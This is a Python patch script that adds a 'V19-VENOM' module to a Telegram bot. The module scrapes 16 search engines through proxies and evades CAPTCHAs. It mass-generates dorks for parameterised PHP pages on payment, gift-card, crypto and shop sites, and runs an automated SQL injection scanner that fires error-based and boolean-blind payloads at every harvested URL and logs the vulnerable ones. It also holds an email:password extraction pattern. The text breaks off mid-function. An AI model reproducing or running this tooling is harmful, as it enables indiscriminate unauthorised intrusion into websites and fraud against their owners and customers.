#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  HYPER VENOM PARSER v19  —  PATCH SCRIPT (Telegram Bot Only, No Web)
  Target : bot_fixed.py
  Adds   : V19-VENOM engine panel + competitor-killer Deep Parser
           • 16 live search engines, multi-page fan-out, auto-retry
           • Live counter UI exactly like paid bots
             (Scanned / Found / Raw / Unique / Filtered / Errors / Retries / Threads)
           • MIN 20 THREADS guarantee + Lite/Medium/High/Beast presets + custom
           • Keyword Maker, Dork Generator, SQLi Checker in one compact panel
           • Termux-safe (RAM-capped dedupe, disk streaming, no OOM)

  Run:
     python3 hyper_venom_parser_v19.py                 # patches bot_fixed.py
     python3 hyper_venom_parser_v19.py bot_fixed.py    # explicit target
================================================================================
"""

import os
import re
import sys
import shutil
import py_compile
from datetime import datetime

V19_BLOCK = r'''
# ═══════════════════════════════════════════════════════════════════════════════
#  ██╗   ██╗ ██╗ █████╗     ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
#  ██║   ██║███║██╔══██╗    ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
#  ██║   ██║╚██║╚█████╔╝    ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
#  ╚██╗ ██╔╝ ██║██╔══██╗    ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
#   ╚████╔╝  ██║╚█████╔╝     ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
#    ╚═══╝   ╚═╝ ╚════╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
#  V19-VENOM ENGINE  •  competitor-killer deep parser  •  Termux/VPS safe
# ═══════════════════════════════════════════════════════════════════════════════
import urllib.parse as urllib_parse  # noqa: E402  (V19 local alias)
import urllib.request as _v19_ureq  # noqa: E402

_V19_TAG = "V19-VENOM"
_V19_MIN_THREADS = 20
_V19_MAX_THREADS = 300
_V19_OUT_DIR = os.path.join(DATA_DIR, "v19_out")
try:
    os.makedirs(_V19_OUT_DIR, exist_ok=True)
except Exception:
    pass
_V19_CFG_PATH = os.path.join(DATA_DIR, "v19_engine.json")
_V19_STOP: dict = {}
_V19_LIVE: Dict[int, dict] = {}


def _v19_hw() -> dict:
    cores = os.cpu_count() or 4
    ram = 8.0
    try:
        with open("/proc/meminfo", "r", encoding="utf-8", errors="ignore") as _mf:
            for _ln in _mf:
                if _ln.startswith("MemTotal:"):
                    ram = round(int(_ln.split()[1]) / (1024 * 1024), 1)
                    break
    except Exception:
        pass
    _prefix = os.environ.get("PREFIX") or ""
    termux = bool(os.environ.get("TERMUX_VERSION")) or ("com.termux" in _prefix)
    return {"cores": cores, "ram": ram, "termux": termux}


_V19_HW = _v19_hw()


def _v19_auto_threads() -> int:
    if _V19_HW["termux"]:
        return max(_V19_MIN_THREADS, min(48, int(_V19_HW["cores"]) * 8))
    return max(_V19_MIN_THREADS, min(240, int(_V19_HW["cores"]) * 12))


_V19_DEFAULT_CFG = {
    "profile": "auto",
    "threads": 0,          # 0 = auto
    "pages": 1,            # SERP pages per engine (1-3)
    "max_per_domain": 250,  # domain diversity cap
    "use_proxies": True,
}


def _v19_load_cfg() -> dict:
    cfg = dict(_V19_DEFAULT_CFG)
    try:
        if os.path.isfile(_V19_CFG_PATH):
            with open(_V19_CFG_PATH, "r", encoding="utf-8") as _cf:
                _data = json.load(_cf)
            if isinstance(_data, dict):
                for _k in list(cfg.keys()):
                    if _k in _data:
                        cfg[_k] = _data[_k]
    except Exception:
        pass
    return cfg


def _v19_save_cfg(patch: dict) -> dict:
    cfg = _v19_load_cfg()
    for _k, _v in (patch or {}).items():
        if _k in cfg:
            cfg[_k] = _v
    try:
        with open(_V19_CFG_PATH, "w", encoding="utf-8") as _cf:
            json.dump(cfg, _cf, indent=2)
    except Exception:
        pass
    return cfg


def _v19_effective() -> dict:
    cfg = _v19_load_cfg()
    prof = str(cfg.get("profile") or "auto")
    threads = int(cfg.get("threads") or 0)
    if threads < _V19_MIN_THREADS:
        threads = _v19_auto_threads()
    if prof == "lite":
        threads = max(_V19_MIN_THREADS, min(threads, 32))
    elif prof == "medium":
        threads = max(_V19_MIN_THREADS, min(threads, 64))
    if _V19_HW["termux"]:
        threads = min(threads, 100)
    threads = max(_V19_MIN_THREADS, min(_V19_MAX_THREADS, threads))
    pages = max(1, min(3, int(cfg.get("pages") or 1)))
    if _V19_HW["termux"] and pages > 2:
        pages = 2
    return {
        "profile": prof,
        "threads": threads,
        "pages": pages,
        "max_per_domain": max(0, int(cfg.get("max_per_domain") or 0)),
        "use_proxies": bool(cfg.get("use_proxies", True)),
        "hw": _V19_HW,
    }


# ─────────────────────────────  URL / SERP ENGINE  ───────────────────────────
_V19_SKIP_DOMAINS = (
    "google.", "bing.com", "microsoft.com", "yahoo.com", "duckduckgo.com",
    "brave.com", "ecosia.org", "aol.com", "mojeek.com", "startpage.com",
    "marginalia.nu", "facebook.com", "instagram.com", "twitter.com", "x.com",
    "youtube.com", "tiktok.com", "linkedin.com", "pinterest.", "reddit.com",
    "wikipedia.org", "amazon.", "ebay.", "github.com", "stackoverflow.com",
    "cloudflare.com", "w3.org", "schema.org", "gstatic.com", "googleapis.com",
    "doubleclick.net", "googletagmanager.com", "cloudfront.net",
)
_V19_JUNK_EXT = re.compile(
    r"\.(?:jpg|jpeg|png|gif|webp|svg|ico|css|js|woff|woff2|ttf|eot|mp4|mp3|avi|pdf|zip|rar|7z|exe|apk|dmg)$",
    re.I,
)
_V19_TRACKING = frozenset([
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "fbclid", "gclid", "msclkid", "twclid", "ttclid", "yclid", "mc_cid", "mc_eid",
])
_V19_RSS_LINK = re.compile(r"<link>\s*(https?://[^<\s]+)\s*</link>", re.I)
_V19_BING_U = re.compile(r"(?:[?&]|&amp;)u=(a1[A-Za-z0-9_\-]+=*)")
_V19_YAHOO_RU = re.compile(r"/RU=([^/\"'<>]+)")
_V19_DDG_UDDG = re.compile(r"[?&]uddg=([^&\"'<>]+)")
_V19_GOOGLE_Q = re.compile(r"/url\?(?:[^\"'<>]*&)?q=(https?[^&\"'<>]+)")
_V19_HREF = re.compile(r'href=["\']([^"\'<>#]{4,700})["\']', re.I)
_V19_FORM = re.compile(r'<form\b[^>]*action=["\']([^"\'<>#]{1,300})["\'][^>]*>(.*?)</form>', re.I | re.S)
_V19_INPUT_NAME = re.compile(r'<input\b[^>]*name=["\']([a-zA-Z0-9_]{1,32})["\']', re.I)
_V19_EMAIL_PASS = re.compile(r"([a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9.\-]+):([^\s:;\"'<>]{4,64})")

# (name, url, method, q-param, extra-params)
_V19_ENGINES = [
    ("bing_rss",   "https://www.bing.com/search",              "get",  "q",     {"format": "rss", "count": "50", "setlang": "en"}),
    ("yahoo_us",   "https://search.yahoo.com/search",          "get",  "p",     {"n": "30", "ei": "UTF-8"}),
    ("mojeek",     "https://www.mojeek.com/search",            "get",  "q",     {}),
    ("ddg_lite",   "https://lite.duckduckgo.com/lite/",        "get",  "q",     {"kl": "us-en"}),
    ("bing_html",  "https://www.bing.com/search",              "get",  "q",     {"count": "50", "setlang": "en"}),
    ("ecosia",     "https://www.ecosia.org/search",            "get",  "q",     {"method": "index"}),
    ("yahoo_uk",   "https://uk.search.yahoo.com/search",       "get",  "p",     {"n": "30", "ei": "UTF-8"}),
    ("brave",      "https://search.brave.com/search",          "get",  "q",     {"source": "web"}),
    ("ddg_html",   "https://html.duckduckgo.com/html/",        "post", "q",     {"kl": "us-en"}),
    ("aol",        "https://search.aol.com/aol/search",        "get",  "q",     {}),
    ("yahoo_in",   "https://in.search.yahoo.com/search",       "get",  "p",     {"n": "30", "ei": "UTF-8"}),
    ("startpage",  "https://www.startpage.com/sp/search",      "post", "query", {}),
    ("marginalia", "https://search.marginalia.nu/search",      "get",  "query", {}),
    ("yahoo_ca",   "https://ca.search.yahoo.com/search",       "get",  "p",     {"n": "30", "ei": "UTF-8"}),
    ("google",     "https://www.google.com/search",            "get",  "q",     {"num": "20", "gbv": "1", "hl": "en"}),
    ("yahoo_au",   "https://au.search.yahoo.com/search",       "get",  "p",     {"n": "30", "ei": "UTF-8"}),
]


def _v19_strip_www(dom: str) -> str:
    d = (dom or "").strip().lower()
    return d[4:] if d.startswith("www.") else d


def _v19_clean_url(u: str, allow_root: bool = False) -> bool:
    try:
        u = (u or "").strip()
        p = urllib_parse.urlparse(u)
        if p.scheme not in ("http", "https"):
            return False
        dom = _v19_strip_www(p.netloc.split(":")[0])
        if not dom or "." not in dom or len(dom) < 4:
            return False
        if not re.match(r"^[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9\-]+)+$", dom):
            return False
        if dom.split(".")[-1] in ("local", "localhost", "invalid", "test", "example"):
            return False
        if any(s in dom for s in _V19_SKIP_DOMAINS):
            return False
        has_q = bool(p.query and "=" in p.query)
        if (not p.path or p.path == "/") and not has_q:
            return allow_root
        if p.path and _V19_JUNK_EXT.search(p.path):
            return False
        if len(u) > 900:
            return False
        return True
    except Exception:
        return False


def _v19_sig(u: str) -> str:
    try:
        p = urllib_parse.urlparse(u)
        dom = _v19_strip_www(p.netloc)
        keys = sorted(set(k.lower() for k, _ in urllib_parse.parse_qsl(p.query, keep_blank_values=True) if k.lower() not in _V19_TRACKING))
        return dom + p.path + "|" + "&".join(keys)
    except Exception:
        return u


def _v19_native_query(dork: str, eng: str) -> str:
    raw = dork or ""
    m_sc = re.search(r"([a-zA-Z0-9_\-]+\.(?:php|asp|aspx|jsp|cfm))", raw, re.I)
    script = m_sc.group(1).lower() if m_sc else ""
    stem = script.rsplit(".", 1)[0] if script else ""
    m_pr = re.search(r"[?&:]?([a-zA-Z0-9_]{1,20})=", raw, re.I)
    param = m_pr.group(1).lower() if m_pr else "id"
    if param in ("inurl", "site", "intitle", "intext", "filetype", "ext"):
        param = "id"
    clean = re.sub(r"\b(?:all)?(?:inurl|intitle|intext|filetype|ext|site):\S+", " ", raw, flags=re.I)
    words = [w for w in re.sub(r"[^a-zA-Z0-9\-]", " ", clean.lower()).split()
             if len(w) >= 2 and not w.isdigit() and w not in ("php", "asp", "html", "htm", stem, param)]
    niche = " ".join(words[:2]) if words else "online shop"
    if eng in ("google", "startpage"):
        return "inurl:%s?%s= %s" % (script or "product.php", param, niche)
    if eng.startswith(("bing", "yahoo", "aol")):
        if stem and stem not in ("index", "main", "home", "default"):
            return "instreamset:(url):%s %s %s" % (stem, param, niche)
        return "%s %s= %s" % (script or "product.php", param, niche)
    return "%s %s %s" % (script or "product.php", param, niche)


def _v19_extract_links(body: str, eng: str) -> list:
    if not body or len(body) < 60:
        return []
    out, seen = [], set()

    def _add(raw_u: str) -> None:
        u = (raw_u or "").replace("&amp;", "&").strip()
        if not u.startswith(("http://", "https://")):
            return
        if "%2F" in u and "uddg=" not in u:
            try:
                u = urllib_parse.unquote(u)
            except Exception:
                pass
        u = u.split("#", 1)[0]
        if "?" not in u:
            u = u.rstrip("/")
        if u and u not in seen and len(u) < 900:
            seen.add(u)
            out.append(u)

    head = body[:7000].lower()
    if eng == "bing_rss" or ("<rss" in head and "<item>" in head):
        for lk in _V19_RSS_LINK.findall(body):
            _add(urllib_parse.unquote(lk) if "%2F" in lk else lk)
        if out:
            return out
    flat = body.replace("&amp;", "&")
    for tok in _V19_BING_U.findall(body):
        raw = tok[2:] if tok.startswith("a1") else tok
        pad = len(raw) % 4
        if pad:
            raw += "=" * (4 - pad)
        for _fn in (base64.urlsafe_b64decode, base64.b64decode):
            try:
                dec = _fn(raw).decode("utf-8", "ignore").strip()
                if dec.startswith(("http://", "https://")):
                    _add(dec)
                    break
            except Exception:
                continue
    for ru in _V19_YAHOO_RU.findall(body):
        _add(urllib_parse.unquote(ru))
    for dg in _V19_DDG_UDDG.findall(flat):
        _add(urllib_parse.unquote(dg))
    for gq in _V19_GOOGLE_Q.findall(flat):
        _add(urllib_parse.unquote(gq))
    for h in _V19_HREF.findall(body):
        hc = h.replace("&amp;", "&").strip()
        if hc.startswith("http"):
            _add(hc)
    return out


_V19_BLOCK_SIGS = (
    "unusual traffic", "are you a robot", "captcha", "verify you are human",
    "detected unusual", "our systems have detected", "enable javascript and cookies",
    "access denied", "request blocked", "too many requests",
)


async def _v19_fetch_serp(session, eng_tuple, dork: str, page: int, proxy: str = "", timeout: float = 9.0) -> tuple:
    name, url, method, qparam, extra = eng_tuple
    params = dict(extra)
    params[qparam] = _v19_native_query(dork, name)
    if name.startswith("yahoo"):
        params["b"] = str(page * 10 + 1)
    elif name == "bing_rss":
        params["first"] = str(page * 10 + 1)
    elif name == "bing_html":
        params["first"] = str(page * 10 + 1)
    elif name == "mojeek":
        params["s"] = str(page * 10)
    elif name == "ecosia":
        params["p"] = str(page + 1)
    elif name == "google":
        params["start"] = str(page * 10)
    elif name in ("ddg_lite", "ddg_html"):
        params["s"] = str(page * 30)
    elif name == "marginalia":
        params["s"] = str(page * 10)
    elif name == "startpage":
        params["page"] = str(page + 1)
    _mock = os.environ.get("_V19_MOCK_SERP") or ""
    if _mock:
        url = _mock.rstrip("/") + "/search"
        params = {"eng": name, "q": params.get(qparam, ""), "page": str(page)}
        method = "get"
    if proxy and not proxy.startswith(("http://", "https://")):
        proxy = "http://" + proxy
    kw = {"timeout": aiohttp.ClientTimeout(total=timeout), "ssl": False, "allow_redirects": True}
    if proxy:
        kw["proxy"] = proxy
    try:
        async with session.request(method.upper(), url, params=params, headers={"User-Agent": random.choice(_V19_UAS)}, **kw) as resp:
            if resp.status != 200:
                return [], "err"
            body = await resp.text(errors="ignore")
    except Exception:
        return [], "err"
    if not body or len(body) < 400:
        return [], "err"
    if any(s in body[:7000].lower() for s in _V19_BLOCK_SIGS):
        return [], "blocked"
    return _v19_extract_links(body, name), "ok"


_V19_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]


def _v19_bar(pct: float, width: int = 16) -> str:
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct * width / 100.0))
    return "█" * filled + "░" * (width - filled)


def _v19_running_text(st: dict) -> str:
    pct = (st["scanned"] * 100.0 / max(1, st["total"]))
    return (
        "🌍 <b>DEEP PARSER — RUNNING</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📥 <b>Done:</b> <code>%s/%s</code> dorks\n"
        "🔗 <b>Found:</b> <code>%s</code> URLs\n"
        "💎 <b>Unique:</b> <code>%s</code>\n"
        "⚠️ <b>Retries:</b> <code>%s</code>\n"
        "⚡ <b>Threads:</b> <code>%s</code>\n\n"
        "<code>[%s]</code> <b>%d%%</b>\n"
        "⏳ <i>Please wait...</i>"
    ) % (
        format(st["scanned"], ","), format(st["total"], ","),
        format(st["unique"], ","), format(st["param"], ","),
        format(st["retries"], ","), st["threads"],
        _v19_bar(pct), int(pct),
    )


def _v19_done_text(st: dict, elapsed: float) -> str:
    return (
        "🌍 <b>DEEP PARSER — COMPLETE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📥 <b>Scanned:</b> <code>%s/%s</code> dorks\n"
        "🔗 <b>Raw URLs:</b> <code>%s</code>\n"
        "💎 <b>Unique URLs:</b> <code>%s</code>\n"
        "🎯 <b>?param= URLs:</b> <code>%s</code>\n"
        "⚠️ <b>Errors:</b> <code>%s</code>\n"
        "🚫 <b>Filtered:</b> <code>%s</code>\n"
        "⚡ <b>Threads:</b> <code>%s</code> • ⏱ <code>%.1fs</code>\n"
        "<code>[%s]</code> <b>100%%</b>\n"
        "📦 <i>Files ready ⬇️</i>"
    ) % (
        format(st["scanned"], ","), format(st["total"], ","),
        format(st["raw"], ","), format(st["unique"], ","),
        format(st["param"], ","), format(st["errors"], ","),
        format(st["filtered"], ","), st["threads"], elapsed,
        _v19_bar(100),
    )


async def _v19_deep_parse(dorks: list, uid: int, progress=None) -> dict:
    """Competitor-grade multi-engine, multi-page, auto-retry deep parser (disk streaming)."""
    eff = _v19_effective()
    threads = int(eff["threads"])
    pages = int(eff["pages"])
    fanout = 3 if pages == 1 else (2 if pages == 2 else 1)
    max_per_domain = int(eff["max_per_domain"]) or 0
    dorks = [d.strip() for d in dorks if d and d.strip()]
    total = len(dorks)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    param_path = os.path.join(_V19_OUT_DIR, "V19_Param_URLs_%s.txt" % ts)
    all_path = os.path.join(_V19_OUT_DIR, "V19_All_URLs_%s.txt" % ts)

    st = {
        "scanned": 0, "total": total, "raw": 0, "unique": 0, "filtered": 0,
        "errors": 0, "retries": 0, "param": 0, "threads": threads,
        "started": time.time(),
    }
    cap = 2_500_000 if _V19_HW["ram"] >= 12 else (900_000 if _V19_HW["ram"] >= 4 else 250_000)
    seen = set()
    sig_count = {}
    dom_count = {}
    stop_ev = _V19_STOP.get(int(uid)) or asyncio.Event()
    proxies = []
    if eff["use_proxies"]:
        try:
            proxies = list(effective_proxy_pool(int(uid)) or [])
        except Exception:
            proxies = []
    sem = asyncio.Semaphore(max(_V19_MIN_THREADS, threads))
    _pf = open(param_path, "w", encoding="utf-8", buffering=1024 * 128)
    _af = open(all_path, "w", encoding="utf-8", buffering=1024 * 128)

    def _commit(links: list) -> None:
        acc_all, acc_par = [], []
        for u in links:
            st["raw"] += 1
            if not _v19_clean_url(u, allow_root=True):
                st["filtered"] += 1
                continue
            dom = _v19_strip_www(urllib_parse.urlparse(u).netloc)
            if max_per_domain and dom_count.get(dom, 0) >= max_per_domain:
                st["filtered"] += 1
                continue
            h = hash(u) & 0x7FFFFFFF
            if h in seen:
                st["filtered"] += 1
                continue
            if len(seen) < cap:
                seen.add(h)
            has_p = "?" in u and "=" in u
            if has_p:
                s = _v19_sig(u)
                limit = 6 if pages >= 2 else 4
                if sig_count.get(s, 0) >= limit:
                    st["filtered"] += 1
                    continue
                sig_count[s] = sig_count.get(s, 0) + 1
            dom_count[dom] = dom_count.get(dom, 0) + 1
            st["unique"] += 1
            acc_all.append(u)
            if has_p:
                st["param"] += 1
                acc_par.append(u)
        if acc_all:
            _af.write("\n".join(acc_all) + "\n")
        if acc_par:
            _pf.write("\n".join(acc_par) + "\n")
        _af.flush()
        _pf.flush()

    connector = aiohttp.TCPConnector(limit=max(50, threads * (fanout + 2)), ssl=False, ttl_dns_cache=300, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:

        async def _one_dork(idx: int, dork: str) -> None:
            if stop_ev.is_set():
                return
            links: list = []
            async with sem:
                for pg in range(pages):
                    if stop_ev.is_set():
                        break
                    tasks = []
                    for off in range(fanout):
                        eng = _V19_ENGINES[(idx * 3 + pg * 5 + off) % len(_V19_ENGINES)]
                        px = proxies[(idx + off + pg) % len(proxies)] if proxies else ""
                        tasks.append(_v19_fetch_serp(session, eng, dork, pg, proxy=px))
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for i, res in enumerate(results):
                        if isinstance(res, Exception):
                            st["errors"] += 1
                            continue
                        got, status = res
                        if status == "ok":
                            links.extend(got)
                        else:
                            st["errors"] += 1
                            st["retries"] += 1
                            if stop_ev.is_set():
                                continue
                            alt = _V19_ENGINES[(idx * 3 + pg * 5 + i + 7) % len(_V19_ENGINES)]
                            got2, status2 = await _v19_fetch_serp(session, alt, dork, pg, proxy="")
                            if status2 == "ok":
                                links.extend(got2)
                _commit(links)
                st["scanned"] += 1

        tasks = [asyncio.create_task(_one_dork(i, d)) for i, d in enumerate(dorks)]
        last_push = 0.0
        try:
            while True:
                pending = [t for t in tasks if not t.done()]
                if not pending:
                    break
                await asyncio.sleep(1.0)
                now = time.time()
                if progress and (now - last_push) >= 2.5:
                    last_push = now
                    try:
                        await progress(dict(st))
                    except Exception:
                        pass
                if stop_ev.is_set():
                    for t in pending:
                        t.cancel()
                    break
        finally:
            _pf.close()
            _af.close()
            for t in tasks:
                if not t.done():
                    t.cancel()

    st["elapsed"] = time.time() - st["started"]
    return {"stats": st, "param_path": param_path, "all_path": all_path}


# ─────────────────────────  KEYWORD + DORK + SQLI CORE  ──────────────────────
_V19_KW_SUFFIX = [
    "checkout", "cart", "order", "billing", "payment", "invoice", "account",
    "login", "register", "member", "dashboard", "portal", "panel", "admin",
    "giftcard", "voucher", "coupon", "redeem", "topup", "wallet", "balance",
    "subscription", "premium", "renewal", "refund", "tracking", "shop", "store",
    "product", "catalog", "price", "discount", "deposit", "withdraw", "transfer",
]
_V19_NICHE_HINTS = {
    "gaming": ["steam", "valorant", "pubg", "gamepass", "robux", "fortnite", "riot", "gift card", "cdkey"],
    "ott": ["netflix", "spotify", "iptv", "disney", "prime", "crunchyroll", "subscription"],
    "crypto": ["usdt", "bitcoin", "crypto", "wallet", "exchange", "voucher"],
    "hosting": ["whmcs", "cpanel", "vps", "hosting", "domain", "saas", "cloud"],
    "ecom": ["stripe", "shopify", "woocommerce", "checkout", "cart", "store"],
}


def _v19_make_keywords(seeds: list, count: int) -> list:
    count = max(1, int(count))
    bases = []
    seen_b = set()
    for s in seeds:
        s = re.sub(r"\s+", " ", str(s or "").strip().lower())
        if not s:
            continue
        toks = [w for w in re.sub(r"[^a-z0-9 ]", " ", s).split() if len(w) >= 2]
        if not toks:
            continue
        for n in (2, 3, 1):
            if len(toks) >= n:
                ph = " ".join(toks[:n])
                if ph not in seen_b:
                    seen_b.add(ph)
                    bases.append(ph)
    if not bases:
        bases = ["online shop", "digital store", "checkout cart"]

    niche_suffix = []
    joined = " ".join(bases).lower()
    for _niche, _words in _V19_NICHE_HINTS.items():
        if any(w in joined for w in _words):
            niche_suffix.extend(["gift card", "instant delivery", "digital code", "vip access"])
            break
    suffix = list(dict.fromkeys(_V19_KW_SUFFIX + niche_suffix))

    out, seen = [], set()

    def _push(kw: str) -> bool:
        kw = re.sub(r"\s+", " ", kw).strip()
        if not kw or len(kw) < 6 or len(kw) > 60 or kw in seen:
            return False
        if not re.search(r"[a-z]{2,}", kw):
            return False
        seen.add(kw)
        out.append(kw)
        return True

    i = 0
    while len(out) < count and i < count * 60 + 5000:
        b = bases[i % len(bases)]
        s = suffix[(i // max(1, len(bases))) % len(suffix)]
        variant = (i // (max(1, len(bases)) * len(suffix))) % 4
        if variant == 0:
            _push("%s %s" % (b, s))
        elif variant == 1:
            _push("%s %s online" % (b, s))
        elif variant == 2:
            _push("%s %s page" % (b, s))
        else:
            _push("buy %s %s" % (b, s))
        i += 1
    return out[:count]


_V19_DORK_FILES = ["product.php", "product_detail.php", "item.php", "itemdetail.php", "details.php",
                   "shop.php", "store.php", "cart.php", "checkout.php", "category.php", "listing.php",
                   "catalog.php", "search.php", "view.php", "page.php", "index.php", "order.php",
                   "account.php", "profile.php", "download.php", "news.php", "article.php", "blog.php",
                   "event.php", "gallery.php", "track.php", "booking.php", "rooms.php", "property.php",
                   "job.php", "course.php", "ticket.php", "invoice.php", "payment.php", "user.php"]
_V19_DORK_PARAMS = ["id", "pid", "cid", "cat", "catid", "item", "itemid", "product", "product_id",
                    "page", "pageid", "view", "aid", "bid", "uid", "user", "userid", "order",
                    "orderid", "invoice", "doc", "file", "album", "gid", "sid", "tid", "nid", "mid"]
_V19_DORK_TLDS = ["com", "net", "org", "in", "co.uk", "io", "shop", "store", "site", "xyz", "online"]


def _v19_stream_dorks(keywords: list, count: int, path: str, style: str = "mix") -> int:
    count = max(10, min(5_000_000, int(count)))
    bases, seen_b = [], set()
    for k in keywords:
        toks = [w for w in re.sub(r"[^a-zA-Z0-9\-]", " ", str(k).lower()).split() if len(w) >= 2 and not w.isdigit()]
        for n in (2, 3, 1):
            if len(toks) >= n:
                ph = " ".join(toks[:n])
                if ph not in seen_b:
                    seen_b.add(ph)
                    bases.append(ph)
    if not bases:
        bases = ["online shop", "checkout cart", "digital store"]
    files, params, tlds = _V19_DORK_FILES, _V19_DORK_PARAMS, _V19_DORK_TLDS
    written = 0
    buf = []
    with open(path, "w", encoding="utf-8", buffering=1024 * 256) as wf:
        i = 0
        while written < count:
            fn = files[i % len(files)]
            pr = params[(i // len(files)) % len(params)]
            kw = bases[(i // 5) % len(bases)]
            tl = tlds[(i // 11) % len(tlds)]
            m = i % 6
            if style == "google":
                d = "inurl:%s?%s= %s" % (fn, pr, kw)
            elif style == "bing":
                d = ("instreamset:(url):%s %s %s" % (fn.rsplit(".", 1)[0], pr, kw)) if m % 2 == 0 else ("%s %s= %s" % (fn, pr, kw))
            else:
                if m == 0:
                    d = "inurl:%s?%s= %s" % (fn, pr, kw)
                elif m == 1:
                    d = "%s?%s= %s" % (fn, pr, kw)
                elif m == 2:
                    d = "inurl:%s?%s= %s site:.%s" % (fn, pr, kw, tl)
                elif m == 3:
                    d = "intitle:\"%s\" inurl:%s %s" % (kw, fn, pr)
                elif m == 4:
                    d = "instreamset:(url):%s %s %s" % (fn.rsplit(".", 1)[0], pr, kw)
                else:
                    d = "%s %s= %s %s" % (fn, pr, kw, tl.replace(".", ""))
            buf.append(d)
            written += 1
            i += 1
            if len(buf) >= 20_000:
                wf.write("\n".join(buf) + "\n")
                buf.clear()
        if buf:
            wf.write("\n".join(buf) + "\n")
    return written


_V19_SQL_ERR = {
    "MySQL": ("you have an error in your sql syntax", "warning: mysql", "mysqli_fetch", "mysql_fetch",
              "check the manual that corresponds to your mysql", "check the manual that corresponds to your mariadb",
              "sqlstate[42000]"),
    "PostgreSQL": ("postgresql query failed", "pg_query()", "pg_exec()",
                   "unterminated quoted string at or near", "syntax error at or near"),
    "MSSQL": ("unclosed quotation mark after the character string", "microsoft ole db provider for sql server",
              "odbc sql server driver"),
    "Oracle": ("ora-01756", "ora-00933"),
    "SQLite": ("sqlite3::sqlexception", "unrecognized token:", "sqlite error"),
}
_V19_SQLI_PAYLOADS = ("'", "\"", "'-- -", "1'", "1 AND 1=1")


def _v19_sql_error(body: str) -> str:
    low = (body or "").lower()
    for db, sigs in _V19_SQL_ERR.items():
        if any(s in low for s in sigs):
            return db
    return ""


def _v19_inject(url: str, idx: int, payload: str) -> str:
    try:
        p = urllib_parse.urlparse(url)
        pairs = urllib_parse.parse_qsl(p.query, keep_blank_values=True)
        if idx >= len(pairs):
            return url
        k, _ = pairs[idx]
        pairs[idx] = (k, payload)
        return urllib_parse.urlunparse(p._replace(query=urllib_parse.urlencode(pairs)))
    except Exception:
        return url


async def _v19_sqli_scan(urls: list, uid: int, progress=None) -> dict:
    eff = _v19_effective()
    threads = max(_V19_MIN_THREADS, int(eff["threads"]))
    if _V19_HW["termux"]:
        threads = min(threads, 80)
    urls = [u.strip() for u in urls if u and u.strip().startswith(("http://", "https://")) and "=" in u]
    total = len(urls)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(_V19_OUT_DIR, "V19_SQLi_Vulns_%s.txt" % ts)
    st = {"scanned": 0, "total": total, "vulns": 0, "errors": 0, "threads": threads, "started": time.time()}
    stop_ev = _V19_STOP.get(int(uid)) or asyncio.Event()
    sem = asyncio.Semaphore(threads)
    hits = []
    connector = aiohttp.TCPConnector(limit=max(60, threads * 3), ssl=False)
    fh = open(out_path, "w", encoding="utf-8", buffering=1024 * 64)

    async with aiohttp.ClientSession(connector=connector) as session:
        async def _get(u: str) -> tuple:
            try:
                async with session.get(u, timeout=aiohttp.ClientTimeout(total=9), ssl=False,
                                       headers={"User-Agent": random.choice(_V19_UAS)}) as r:
                    return r.status, await r.text(errors="ignore")
            except Exception:
                return 0, ""

        async def _one(u: str) -> None:
            if stop_ev.is_set():
                return
            async with sem:
                code, body = await _get(u)
                hit = ""
                dbms = ""
                if code == 0:
                    st["errors"] += 1
                else:
                    base_db = _v19_sql_error(body)
                    npairs = min(3, len(urllib_parse.parse_qsl(urllib_parse.urlparse(u).query)))
                    for idx in range(max(1, npairs)):
                        for pay in _V19_SQLI_PAYLOADS:
                            c2, b2 = await _get(_v19_inject(u, idx, pay))
                            d = _v19_sql_error(b2)
                            if d and d != base_db:
                                hit, dbms = u, d
                                break
                        if hit:
                            break
                        if code == 200 and len(body) > 140:
                            ct, bt = await _get(_v19_inject(u, idx, " AND 1=1-- -"))
                            cf, bf = await _get(_v19_inject(u, idx, " AND 1=2-- -"))
                            if ct == 200 and cf == 200:
                                dt = abs(len(bt) - len(body))
                                df = abs(len(bf) - len(body))
                                if dt < max(40, int(len(body) * 0.04)) and df > max(140, int(len(body) * 0.12)):
                                    hit, dbms = u, "MySQL/Generic(Blind)"
                                    break
                st["scanned"] += 1
                if hit:
                    st["vulns"] += 1
                    hits.append((hit, dbms))
                    fh.write(hit + "\n")
                    fh.flush()

        tasks = [asyncio.create_task(_one(u)) for u in urls]
        last = 0.0
        while True:
            pending = [t for t in tasks if not t.done()]
            if not pending:
                break
            await asyncio.sleep(1.0)
            if progress and (time.time() - last) >= 3.0:
                last = time.time()
                try:
                    await progress(dict(st))
                except Exception:
                    pass
            if stop_ev.is_set():
                for t in pending:
                    t.cancel()
                break
        fh.close()

    st["elapsed"] = time.time() - st["started"]
